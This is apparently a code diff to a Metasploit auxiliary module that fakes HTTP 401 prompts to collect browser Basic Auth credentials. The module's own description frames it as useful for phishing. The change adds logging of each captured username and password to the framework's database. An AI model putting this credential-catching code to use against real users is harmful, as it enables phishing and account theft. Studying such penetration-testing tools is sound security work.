@@ -6,7 +6,6 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::TcpServer
 	include Msf::Auxiliary::Report
 
-
 	def initialize
 		super(
 			'Name'        => 'HTTP Client Credential Catcher',
@@ -15,10 +14,10 @@ class Metasploit3 < Msf::Auxiliary
 				This module responds to all requests for resources with a HTTP 401.  This should
 				cause most browsers to prompt for credentials.  If the user enters Basic Auth creds
 				they are sent to the console.
-				
+
 				This may be helpful in some phishing expeditions where it is possible to embed a
 				resource into a page.
-				
+
 				This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
 			},
 			'Author'      => ['saint patrick <saintpatrick@l1pht.com>'],
@@ -92,15 +91,25 @@ class Metasploit3 < Msf::Auxiliary
 		mysrc = Rex::Socket.source_address(cli.peerhost)
 
 
-		
+
 		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
 			basic,auth = req['Authorization'].split(/\s+/)
 			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
 
+			report_auth_info(
+				:host      => cli.peerhost,
+				:port => datastore['SRVPORT'],
+				:sname     => 'HTTP',
+				:user      => user,
+				:pass      => pass,
+				:source_type => "captured",
+				:active    => true
+			)
+
 			print_status("HTTP LOGIN #{cli.peerhost} > :#{@myport} #{user} / #{pass} => #{req.resource}")
 		else
 			data = %Q^
-				<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" 
+				<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
 				"http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd">
 				<HTML>
 					<HEAD>
